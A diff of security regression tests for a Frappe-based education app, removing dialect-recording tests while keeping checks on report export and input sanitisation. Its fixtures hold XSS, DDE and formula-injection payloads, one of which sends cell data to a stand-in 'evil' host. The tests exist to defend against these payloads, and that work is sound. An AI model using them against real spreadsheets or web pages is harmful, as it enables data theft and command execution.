@@ -2345,13 +1574,10 @@ class TestReportOutputGuards(FrappeTestCase):
 	XSS = '<img src=x onerror=alert(document.domain)>'
 	FORMULA = '=HYPERLINK("http://evil/?"&A1,"CLICK ME")'
 	DDE = "+cmd|' /C calc'!A0"
-	# the export IS the dialect corpus: these characters must survive byte-for-byte
+	# the export must show what she typed: these characters survive byte-for-byte
 	DEVANAGARI = 'मैं "बोली" बोलती हूँ 🙂 — it\'s fine & good'
 	# a real multi-sentence Bhojpuri transcription — far past the old 120-char cut
-	LONG_TR = ("हमरा गाँव में एगो बड़हन पोखरा बा जेकरा किनारे रोज साँझ के हमनी के खेलल जाई "
-	           "आउर ओहिजे बगइचा में आम के गाछ लागल बा जेकर फल गरमी में बहुते मीठ होला")
 	LEAD = ("=", "+", "-", "@", "\t", "\r")
-	HEAD = b"RIFF$\x00\x00\x00WAVEfmt " + b"\x00" * 32
 
 	# ------------------------------------------------------------------ fixtures
 	def setUp(self):
@@ -2484,8 +1710,7 @@ class TestReportOutputGuards(FrappeTestCase):
 		        ("Daily Attendance", {"from_date": today, "to_date": today}),
 		        ("Activity Drill-down", {}),
 		        ("Lesson Trouble Spots", {}),
-		        ("Student Engagement", {}),
-		        ("Boli Adjudication Queue", {})]
+		        ("Student Engagement", {})]
 		return [(r, f) for r, f in plan if frappe.db.exists("Report", r)]
 
 	def _seed_everything(self):
@@ -2496,22 +1721,6 @@ class TestReportOutputGuards(FrappeTestCase):
 			self._attempt(g, coh)
 			self._attendance(g)
 			girls.append(g)
-		if frappe.db.exists("DocType", "Dialect Capture"):
-			clip = frappe.get_doc({"doctype": "Dialect Capture", "student": girls[1].name,
-			                       "student_name": girls[1].student_name,
-			                       "prompt_text_hi": self.FORMULA + self.XSS,
-			                       "status": "recorded", "consent_status": "missing",
-			                       "speaker_relation": "self", "rework_rounds": 0,
-			                       "captured_on": frappe.utils.now()})
-			clip.flags.ignore_validate = True
-			clip.flags.ignore_mandatory = True
-			clip = clip.insert(ignore_permissions=True)
-			tr = frappe.get_doc({"doctype": "Boli Transcription", "clip": clip.name,
-			                     "author": girls[1].name, "text": self.LONG_TR,
-			                     "version": 1, "status": "submitted"})
-			tr.flags.ignore_validate = True
-			tr.flags.ignore_mandatory = True
-			tr.insert(ignore_permissions=True)
 		frappe.db.commit()
 		return coh, girls
 
@@ -2562,15 +1771,15 @@ class TestReportOutputGuards(FrappeTestCase):
 		                "harness cannot detect formula injection")
 
 	def test_export_is_formula_safe_and_never_entity_mangled(self):
-		"""R2 + H9 together. The spreadsheet is the PA's copy of the dialect corpus, so
-		the ONLY change the export may make to a stored value is one leading apostrophe
+		"""R2 + H9 together. The spreadsheet is the facilitator's copy of what the girls
+		wrote, so the ONLY change the export may make to a stored value is one leading apostrophe
 		to stop Excel evaluating it. HTML-escaping here (which is what the first fix did)
 		turned `it's fine & good` into `it&apos;s fine &amp; good` — corrupted data."""
 		from frappe.utils.xlsxutils import handle_html
 		coh, girls = self._seed_everything()
 		stored = [frappe.db.get_value("Student", g.name, "student_name") for g in girls]
 		for report, filters in self._reports():
-			if report in ("Lesson Trouble Spots", "Boli Adjudication Queue"):
+			if report == "Lesson Trouble Spots":
 				continue                     # no student_name column
 			book = self._export(report, filters)
 			cells = self._xlsx_strings(book)
@@ -2670,22 +1879,6 @@ class TestReportOutputGuards(FrappeTestCase):
 		frappe.flags.hikmat_report_export = True
 		self.assertEqual(ru.safe_cell("abcdefghij", 4), "abcdefghij")
 
-	def test_boli_queue_shows_a_long_transcription_whole(self):
-		"""R1: the PA's job in this queue is to pick or edit the FINAL transcription, so
-		a 120-character cut mid-sentence made the report useless for its own purpose."""
-		if not frappe.db.exists("DocType", "Dialect Capture"):
-			self.skipTest("Boli doctypes not installed on this site")
-		self._seed_everything()
-		res = self._grid("Boli Adjudication Queue")
-		mine = [r["transcription"] for r in res.result
-		        if self.LONG_TR[:20] in r.get("transcription", "")]
-		self.assertTrue(mine, "the queue did not show the long transcription at all")
-		for v in mine:
-			self.assertEqual(len(v), len(self.LONG_TR),
-			                 "transcription was truncated: " + repr(v))
-		csv = self._export("Boli Adjudication Queue", fmt="CSV").decode("utf-8")
-		self.assertIn(self.LONG_TR, csv)
-
 	def test_converted_reports_no_longer_store_their_sql(self):
 		"""The two SQL-defined reports are now Script Reports whose body is a file on
 		disk. A `query` back in the DB row means someone re-seeded the unguarded
@@ -2711,61 +1904,32 @@ class TestReportOutputGuards(FrappeTestCase):
 		self.assertTrue(res.columns)
 
 	# ------------------------------------------------------------------ erasure
-	def test_cohort_erasure_takes_the_whole_voice_trail_and_the_bytes(self):
-		"""C1/H10 again, at the third erasure call site. setup_data.single_center()
-		removed only Lesson Attempt rows and then force-deleted the Student, leaving her
-		Dialect Capture rows in the peer queues with a dangling `student` link — a
-		verifier was then offered the deleted girl's clip and downloaded her audio.
-		Tested through erase_cohort_learners(), the helper single_center() delegates to
-		(single_center itself sweeps every cohort on the site, so it is not safely
-		testable; the helper is where the fix lives)."""
-		if not frappe.db.exists("DocType", "Dialect Capture"):
-			self.skipTest("Boli doctypes not installed on this site")
+	def test_cohort_erasure_takes_the_whole_learner_trail(self):
+		"""C1/H10 again, at the third erasure call site. setup_data.single_center() removed
+		only Lesson Attempt rows and then force-deleted the Student, leaving the rest of her
+		trail behind with a dangling `student` link that nothing noticed — Frappe's Links
+		carry no FK constraint. Tested through erase_cohort_learners(), the helper
+		single_center() delegates to (single_center itself sweeps every cohort on the site,
+		so it is not safely testable; the helper is where the fix lives)."""
 		from hikmat import setup_data
 		doomed = self._cohort("R2 Doomed Cohort")
 		kept = self._cohort("R2 Kept Cohort")
 		girl = self._student("RGuard Doomed Girl", cohort=doomed, with_user=True)
 		peer = self._student("RGuard Kept Girl", cohort=kept)
-		self._attempt(girl, doomed)
-		self._attendance(girl)
-		hers = api._save_dialect_capture(
-			self.HEAD + b"R2-doomed", "audio/wav", student=girl.name,
-			token=api._token_for(girl.name), track="boli-t", lesson="l1",
-			duration_secs=9, client_id="r2-doomed")
-		self.assertTrue(hers.get("ok"), hers)
-		theirs = api._save_dialect_capture(
-			self.HEAD + b"R2-kept", "audio/wav", student=peer.name,
-			token=api._token_for(peer.name), track="boli-t", lesson="l1",
-			duration_secs=9, client_id="r2-kept", operator=girl.name)
-		self.assertTrue(theirs.get("ok"), theirs)
-		frappe.get_doc({"doctype": "Boli Transcription", "clip": theirs["id"],
-		                "author": girl.name, "text": "ओकर लिखल",
-		                "version": 1}).insert(ignore_permissions=True)
+		for who, coh in ((girl, doomed), (peer, kept)):
+			self._attempt(who, coh)
+			self._attendance(who)
 		frappe.db.commit()
-
-		def _path(clip):
-			url = frappe.db.get_value("Dialect Capture", clip, "audio_file")
-			return os.path.join(frappe.utils.get_files_path(is_private=1),
-			                    url.rsplit("/", 1)[-1])
-		her_audio, their_audio = _path(hers["id"]), _path(theirs["id"])
-		self.assertTrue(os.path.exists(her_audio))
 
 		self.assertEqual(setup_data.erase_cohort_learners(doomed), 1)
 
 		self.assertFalse(frappe.db.exists("Student", girl.name))
 		for dt in api._LEARNER_DOCTYPES:
 			self.assertEqual(frappe.db.count(dt, {"student": girl.name}), 0, dt)
-		self.assertEqual(frappe.db.count("Dialect Capture", {"student": girl.name}), 0)
-		self.assertEqual(frappe.db.count("Boli Speaker", {"student": girl.name}), 0)
-		self.assertEqual(frappe.db.count("Boli Transcription", {"author": girl.name}), 0)
-		self.assertEqual(frappe.db.count("File", {"attached_to_name": hers["id"]}), 0)
-		self.assertFalse(os.path.exists(her_audio), "her audio BYTES survived the erasure")
 		self.assertFalse(frappe.db.exists("User", girl.user))
-		# the peer she only operated keeps her recording, minus every reference to her
-		self.assertTrue(frappe.db.exists("Dialect Capture", theirs["id"]))
-		self.assertTrue(os.path.exists(their_audio))
-		self.assertFalse(frappe.db.get_value("Dialect Capture", theirs["id"], "operator"))
+		# the cohort next door is untouched — rows AND the girl herself
 		self.assertTrue(frappe.db.exists("Student", peer.name))
+		self.assertEqual(frappe.db.count("Lesson Attempt", {"student": peer.name}), 1)
 
 
 class TestIngestSanitisation(FrappeTestCase):
@@ -2794,7 +1958,6 @@ class TestIngestSanitisation(FrappeTestCase):
 	# it only pre-sanitizes form_dict for GUESTS anyway — an online learner has no such layer.
 	XSS = '"<img src=x onerror=document.title=\'PWN\'>"'
 	FORMULA = '=HYPERLINK("http://evil/?"&A1,"HI")'
-	WAV = b"RIFF$\x00\x00\x00WAVEfmt " + b"\x00" * 32
 
 	# ------------------------------------------------------------------ fixtures
 	def _mk_student(self, name):
@@ -2807,18 +1970,6 @@ class TestIngestSanitisation(FrappeTestCase):
 		def _rm():
 			frappe.set_user("Administrator")
 			frappe.db.commit()
-			clips = frappe.get_all("Dialect Capture", filters={"student": doc.name}, pluck="name")
-			for cap in clips:
-				frappe.db.delete("File", {"attached_to_doctype": "Dialect Capture",
-				                          "attached_to_name": cap})
-			if clips:
-				frappe.db.delete("Boli Verification", {"clip": ["in", clips]})
-				frappe.db.delete("Boli Transcription", {"clip": ["in", clips]})
-				frappe.db.delete("Boli XP Ledger", {"clip": ["in", clips]})
-			frappe.db.delete("Boli Transcription", {"author": doc.name})
-			frappe.db.delete("Boli XP Ledger", {"student": doc.name})
-			frappe.db.delete("Boli Speaker", {"student": doc.name})
-			frappe.db.delete("Dialect Capture", {"student": doc.name})
 			for dt in ("Lesson Attempt", "Test Attempt", "Lesson Doubt", "Learning Event",
 			           "Attendance Ping", "Attendance Day", "Evaluation"):
 				frappe.db.delete(dt, {"student": doc.name})
@@ -2828,31 +1979,6 @@ class TestIngestSanitisation(FrappeTestCase):
 		self.addCleanup(_rm)
 		frappe.db.commit()
 		return doc.name, api._token_for(doc.name)
-
-	def _mk_prompt(self, key="r2ing-tr"):
-		"""Track + Lesson + an AUTHORED Dialect Prompt (category market_money, tier 5)."""
-		def _rm():
-			frappe.db.delete("Dialect Prompt", {"lesson": key + "-l1"})
-			frappe.db.delete("Lesson", {"track": key})
-			frappe.db.delete("Track", {"name": key})
-			frappe.db.commit()
-			api.clear_content_cache()
-
-		self.addCleanup(_rm)
-		for dt, dn in (("Dialect Prompt", key + "-l1-p1"), ("Lesson", key + "-l1"), ("Track", key)):
-			if frappe.db.exists(dt, dn):
-				frappe.delete_doc(dt, dn, force=1, ignore_permissions=True)
-		frappe.get_doc({"doctype": "Track", "track_key": key, "title": "R2 Ingest",
-		                "published": 1}).insert(ignore_permissions=True)
-		frappe.get_doc({"doctype": "Lesson", "track": key, "lesson_key": "l1", "title": "L1",
-		                "published": 1}).insert(ignore_permissions=True)
-		frappe.get_doc({"doctype": "Dialect Prompt", "lesson": key + "-l1", "prompt_key": "p1",
-		                "prompt_text_hi": "बाजार में क्या मिला?",
-		                "category": "market_money", "complexity_tier": 5,
-		                "sort_order": 0}).insert(ignore_permissions=True)
-		frappe.db.commit()
-		api.clear_content_cache()
-		return key
 
 	def _inert(self, *values):
 		"""No stored value may carry an angle bracket — nor an HTML entity: these strings are
@@ -3052,85 +2178,7 @@ class TestIngestSanitisation(FrappeTestCase):
 		self._inert(stored)
 		self.assertNotIn(stored[:1], ("=", "+", "-", "@"), repr(stored))
 
-	# ---------------------------------------------------------------- Boli ingest
-	def test_the_authored_prompt_owns_its_category_and_tier(self):
-		"""Corpus metadata about an AUTHORED prompt comes from the prompt, not the device.
-		Two bugs here: `category or pinfo[...]` ran BEFORE normalisation, so junk that
-		reduces to "" was still truthy and the row stored '' instead of 'market_money'; and
-		`tier` stayed client-authored, so a learner could file tier=9 against a tier-5 prompt.
-		"""
-		if not frappe.db.exists("DocType", "Dialect Prompt"):
-			self.skipTest("Boli doctypes not installed on this site")
-		key = self._mk_prompt()
-		stu, tok = self._mk_student("R2Ing Capture Girl")
-		r = api._save_dialect_capture(self.WAV, "audio/wav", student=stu, token=tok, track=key,
-		                              lesson="l1", prompt_key="p1", category="<b></b>", tier=9,
-		                              prompt_text_hi=self.XSS, client_id="r2ing-c1")
-		self.assertTrue(r.get("ok"), r)
-		row = frappe.db.get_value("Dialect Capture", r["id"],
-		                          ["category", "tier", "prompt", "prompt_text_hi"], as_dict=True)
-		self.assertEqual(row.prompt, key + "-l1-p1")
-		self.assertEqual(row.category, "market_money")        # was '' (junk read as truthy)
-		self.assertEqual(row.tier, 5)                         # was 9 (her own number)
-		self.assertEqual(row.prompt_text_hi,
-		                 "बाजार में क्या मिला?")
-		# a DANGLING key has no authored row to trust: her values are kept, plain and clamped
-		r = api._save_dialect_capture(self.WAV, "audio/wav", student=stu, token=tok, track=key,
-		                              lesson="l1", prompt_key="gone9", category="<i>x</i>free",
-		                              tier=99, prompt_text_hi="अपनी " + self.CONJ,
-		                              client_id="r2ing-c2")
-		self.assertTrue(r.get("ok"), r)
-		row = frappe.db.get_value("Dialect Capture", r["id"],
-		                          ["category", "tier", "prompt", "prompt_text_hi"], as_dict=True)
-		self.assertFalse(row.prompt)
-		self.assertEqual(row.category, "x free")
-		self.assertEqual(row.tier, 9)
-		self.assertIn(self.CONJ, row.prompt_text_hi)
-		self._inert(row.category, row.prompt_text_hi)
 
-	def test_transcription_text_and_lint_warnings_are_plain_text(self):
-		"""lint_warnings was stored raw. It does not reach a grid TODAY, which is exactly why
-		it needs the same treatment as the transcription beside it — the next column added to
-		the adjudication report must not be the one that executes."""
-		if not frappe.db.exists("DocType", "Boli Transcription"):
-			self.skipTest("Boli doctypes not installed on this site")
-		rec, rtok = self._mk_student("R2Ing Rec Girl")
-		txr, ttok = self._mk_student("R2Ing Txr Girl")
-		cap = api._save_dialect_capture(self.WAV, "audio/wav", student=rec, token=rtok,
-		                                track="r2ing-t", lesson="l1", prompt_text_hi="कहाँ?",
-		                                duration_secs=20, client_id="r2ing-rec1")
-		self.assertTrue(cap.get("ok"), cap)
-		her_words = self.CONJ + " " + self.FINAL + " बाजार में"
-		r = api.submit_transcription(student=txr, token=ttok, clip=cap["id"],
-		                             text=her_words + " " + self.XSS,
-		                             lint_warnings=self.XSS, client_id="r2ing-tx1")
-		self.assertTrue(r.get("ok"), r)
-		row = frappe.db.get_value("Boli Transcription", r["name"],
-		                          ["text", "lint_warnings"], as_dict=True)
-		self._inert(row.text, row.lint_warnings)
-		self.assertTrue(row.text.startswith(her_words),
-		                [hex(ord(c)) for c in row.text[:len(her_words)]])
-
-
-# ---------------------------------------------------------------------------
-# Round-3 security regressions (audit 2026-07-28, second pass).
-#
-# Round 2 converted TWO SQL-bodied facilitator reports (`Lesson Trouble Spots`,
-# `Student Engagement`) into guarded script reports and left FIVE siblings with the
-# identical defect: `Hardest Questions`, `Student Progress`, `Confusion Heatmap`,
-# `AI Review Queue` and `Pending Evaluations` were still Query Reports whose body was
-# a SQL string in the Report row, so learner text reached the Desk grid as an
-# unescaped "Data" cell (frappe's Data formatter returns it unchanged;
-# frappe-datatable then assigns `$cell.innerHTML = …` inside a System Manager
-# session) and reached the facilitator's spreadsheet as an evaluable formula cell.
-#
-# The last test in this class is the one that is supposed to stop a round SEVEN: it
-# sweeps every Report row on the site and every report package in the app, and fails
-# on anything that is not a guarded script report.
-#
-# Appended as ONE class at the end of the file on purpose: it minimises merge
-# collisions with the other hardening work landing in this file.
-# ---------------------------------------------------------------------------
 
 # Reports that legitimately exist on a site WITHOUT being guarded Hikmat script
 # reports. Keep this list empty of anything a facilitator can open: every entry is a
@@ -3577,7 +2625,6 @@ class TestRound3LockoutOwnershipAndIngest(FrappeTestCase):
 	her out of her own profile, not arbitrary constants."""
 
 	PIN = "4321"
-	WAV = b"RIFF$\x00\x00\x00WAVEfmt " + b"\x00" * 32
 	ZWJ = chr(0x200D)
 	LEADS = ('=HYPERLINK("http://evil/?"&A1,"HI")', "+cmd|' /C calc'!A0", "@SUM(A1)",
 	         "-2+3", "\tsneaky", "\rsneaky")
@@ -3605,21 +2652,6 @@ class TestRound3LockoutOwnershipAndIngest(FrappeTestCase):
 		def _rm():
 			frappe.db.commit()
 			for s in frappe.get_all("Student", filters={"student_name": name}, pluck="name"):
-				clips = frappe.get_all("Dialect Capture", filters={"student": s}, pluck="name")
-				for cap in clips:
-					frappe.db.delete("File", {"attached_to_doctype": "Dialect Capture",
-					                          "attached_to_name": cap})
-				if clips:
-					frappe.db.delete("Boli Verification", {"clip": ["in", clips]})
-					frappe.db.delete("Boli Transcription", {"clip": ["in", clips]})
-					frappe.db.delete("Boli XP Ledger", {"clip": ["in", clips]})
-				frappe.db.delete("Boli Verification", {"verifier": s})
-				frappe.db.delete("Boli Transcription", {"author": s})
-				frappe.db.delete("Boli XP Ledger", {"student": s})
-				frappe.db.delete("Boli Speaker", {"student": s})
-				frappe.db.sql("update `tabDialect Capture` set claimed_by=null, "
-				              "claim_expires=null where claimed_by=%s", s)
-				frappe.db.delete("Dialect Capture", {"student": s})
 				for dt in ("Lesson Attempt", "Test Attempt", "Lesson Doubt", "Learning Event",
 				           "Attendance Ping", "Attendance Day"):
 					frappe.db.delete(dt, {"student": s})
@@ -3841,8 +2873,8 @@ class TestRound3LockoutOwnershipAndIngest(FrappeTestCase):
 	# ================================================ 2. availability of the ceilings
 	def test_a_busy_hour_for_thirty_girls_on_one_ip_refuses_nothing(self):
 		"""Every per-IP ceiling in the app at once, for a NAT'd classroom — including the
-		FAIL-CLOSED ones, where a refusal would stop a girl recording or enrolling. The
-		tightest ceiling is signup (60/h); a 30-girl class fits with room to spare."""
+		FAIL-CLOSED one, where a refusal would stop a girl enrolling. The tightest ceiling
+		is signup (60/h); a 30-girl class fits with room to spare."""
 		self.addCleanup(_use_trusted_proxies([]))
 		old = getattr(frappe.local, "request", None)
 		self.addCleanup(lambda: setattr(frappe.local, "request", old))
@@ -3851,8 +2883,7 @@ class TestRound3LockoutOwnershipAndIngest(FrappeTestCase):
 		self.assertEqual(ip, "203.0.113.77")
 		LOAD = (                     # (bucket, ceiling, calls per girl per hour, fail_closed)
 			("submit", 3000, 12, False), ("event", 6000, 20, False), ("att", 2000, 12, False),
-			("doubt", 2000, 3, False), ("testsub", 600, 1, False), ("capture", 600, 2, True),
-			("boli-tx", 1200, 5, False), ("boli-vf", 3000, 10, False), ("signup", 60, 1, True),
+			("doubt", 2000, 3, False), ("testsub", 600, 1, False), ("signup", 60, 1, True),
 		)
 		refused = {}
 		for bucket, limit, per_girl, closed in LOAD:
@@ -3865,85 +2896,6 @@ class TestRound3LockoutOwnershipAndIngest(FrappeTestCase):
 		self.assertEqual(refused, {})
 		# and the login-failure ceiling leaves room for a whole class mistyping
 		self.assertGreaterEqual(api._MAX_PIN_FAILS_PER_IP, 30 * 8)
-
-	# ============================================ 3. a deactivated girl's recordings
-	def test_deactivating_a_girl_pulls_her_clips_out_of_the_pipeline(self):
-		"""M-round-3: the queue and the audio stream checked only that her Student ROW existed.
-		A girl who was offboarded — or whose guardian withdrew consent — kept having her voice
-		handed to and played by classmates."""
-		if not frappe.db.exists("DocType", "Dialect Capture"):
-			self.skipTest("Boli doctypes not installed on this site")
-		rec, rtok = self._mk("R3Own Recorder")
-		peer, ptok = self._mk("R3Own Peer")
-		txr, ttok = self._mk("R3Own Txr")
-		c1 = api._save_dialect_capture(self.WAV + b"a", "audio/wav", student=rec.name, token=rtok,
-		                               track="r3own", lesson="l1", duration_secs=9,
-		                               client_id="r3own-c1")["id"]
-		c2 = api._save_dialect_capture(self.WAV + b"b", "audio/wav", student=rec.name, token=rtok,
-		                               track="r3own", lesson="l1", duration_secs=9,
-		                               client_id="r3own-c2")["id"]
-		api.get_boli_queue(student=txr.name, token=ttok, kind="transcribe")
-		api.submit_transcription(student=txr.name, token=ttok, clip=c2, text="बाजार में",
-		                         client_id="r3own-tx")
-		frappe.db.set_value("Dialect Capture", c1, {"claimed_by": None, "claim_expires": None},
-		                    update_modified=False)
-		# the queue serves OLDEST first and a batch is capped at 20, so date the fixtures back:
-		# on a site that already holds many clips, membership of the batch must not be luck.
-		for cap in (c1, c2):
-			frappe.db.set_value("Dialect Capture", cap, "captured_on", "2020-01-01 00:00:00",
-			                    update_modified=False)
-		frappe.db.commit()
-
-		def offered(kind, clip):
-			q = api.get_boli_queue(student=peer.name, token=ptok, kind=kind, batch=20)
-			return clip in [i["clip"] for i in q.get("items", [])]
-
-		def streamed(clip):
-			frappe.local.response.pop("filecontent", None)   # a stale value must not mask a leak
-			r = api.get_boli_audio(student=peer.name, token=ptok, clip=clip)
-			body = frappe.local.response.pop("filecontent", None)
-			return (r or {}).get("error") if r else ("AUDIO" if body else None)
-
-		# baseline: she is active, so this is ordinary peer work
-		self.assertTrue(offered("transcribe", c1))
-		self.assertTrue(offered("verify", c2))
-		self.assertEqual(streamed(c1), "AUDIO")
-		self.assertEqual(streamed(c2), "AUDIO")
-
-		frappe.db.set_value("Student", rec.name, "active", 0, update_modified=False)
-		frappe.db.commit()
-		self.assertFalse(offered("transcribe", c1))          # not handed out any more
-		self.assertFalse(offered("verify", c2))
-		self.assertEqual(streamed(c1), "not_found")          # and not streamable either
-		self.assertEqual(streamed(c2), "not_found")
-		# the write paths refuse too, so no peer can advance her clip while she is off
-		self.assertEqual(api.submit_transcription(student=peer.name, token=ptok, clip=c1,
-		                                          text="जांच", client_id="r3own-w1"
-		                                          ).get("error"), "not_found")
-		self.assertEqual(api.submit_verification(student=peer.name, token=ptok, clip=c2,
-		                                         verdict="accept", client_id="r3own-v1"
-		                                         ).get("error"), "not_found")
-		# DELIBERATE: her clip keeps its place in the pipeline (a pause, not a rewrite), so
-		# reactivating a girl who was switched off by mistake restores it untouched.
-		self.assertEqual(frappe.db.get_value("Dialect Capture", c2, "status"), "in_verification")
-		frappe.db.set_value("Student", rec.name, "active", 1, update_modified=False)
-		# release the lease the BASELINE probe legitimately took, or the transcribe queue would
-		# skip c1 for the honest reason that it is still leased to this very peer
-		frappe.db.set_value("Dialect Capture", c1, {"claimed_by": None, "claim_expires": None},
-		                    update_modified=False)
-		frappe.db.commit()
-		self.assertTrue(offered("transcribe", c1))
-		self.assertTrue(offered("verify", c2))
-		self.assertEqual(streamed(c2), "AUDIO")
-
-	def test_owner_participating_covers_both_gone_and_switched_off(self):
-		"""ONE definition, used by the queue SQL, the stream and both write paths."""
-		girl, _ = self._mk("R3Own Guard Girl")
-		self.assertTrue(api._owner_participating(frappe._dict(student=girl.name)))
-		frappe.db.set_value("Student", girl.name, "active", 0, update_modified=False)
-		self.assertFalse(api._owner_participating(frappe._dict(student=girl.name)))
-		self.assertFalse(api._owner_participating(frappe._dict(student="no-such-girl")))
-		self.assertFalse(api._owner_participating(frappe._dict(student=None)))
 
 	# ==================================================== 4. formula injection at ingest
 	def test_identifier_fields_lose_a_formula_lead_at_ingest(self):
@@ -4002,23 +2954,16 @@ class TestRound3LockoutOwnershipAndIngest(FrappeTestCase):
 			self.assertNotIn(stored[:1], "=+-@\t\r", repr(stored))
 
 	def test_her_own_words_are_never_rewritten_to_suit_a_spreadsheet(self):
-		"""THE LINE THIS MUST NOT CROSS. A transcription, a doubt question or a free prompt is
-		her PROSE: '=5 किलो' and '- बाजार में' are things a girl legitimately writes, and the
-		whole point of this corpus is that it is what she said. Prose stays protected by the
-		lossless OUTPUT guard, never by editing the stored value."""
-		if not frappe.db.exists("DocType", "Boli Transcription"):
-			self.skipTest("Boli doctypes not installed on this site")
-		rec, rtok = self._mk("R3Ing Prose Rec")
+		"""THE LINE THIS MUST NOT CROSS. A doubt question is her PROSE: '=5 किलो' and
+		'- बाजार में' are things a girl legitimately writes, and a report must show what she
+		actually wrote. Prose stays protected by the lossless OUTPUT guard, never by editing
+		the stored value."""
 		txr, ttok = self._mk("R3Ing Prose Txr")
-		cap = api._save_dialect_capture(self.WAV + b"p", "audio/wav", student=rec.name,
-		                                token=rtok, track="r3ing", lesson="l1",
-		                                prompt_text_hi="कितने का?", duration_secs=9,
-		                                client_id="r3ing-cap")
 		her_words = "=5 किलो आलू - बाजार में क्" + self.ZWJ + "ष मिला @दुकान पर +2 रुपया"
-		r = api.submit_transcription(student=txr.name, token=ttok, clip=cap["id"],
-		                             text=her_words, client_id="r3ing-tx")
-		self.assertTrue(r.get("ok"), r)
-		self.assertEqual(frappe.db.get_value("Boli Transcription", r["name"], "text"), her_words,
+		d = api.report_doubt(student=txr.name, token=ttok, track="life-skills", lesson="l1",
+		                     activity="quiz", question=her_words, client_id="r3ing-tx")
+		self.assertTrue(d.get("ok"), d)
+		self.assertEqual(frappe.db.get_value("Lesson Doubt", d["name"], "question"), her_words,
 		                 [hex(ord(ch)) for ch in her_words[:4]])
 		q = api.report_doubt(student=txr.name, token=ttok, track="life-skills", lesson="l1",
 		                     activity="quiz", question="=यह क्यों? -मदद चाहिए",
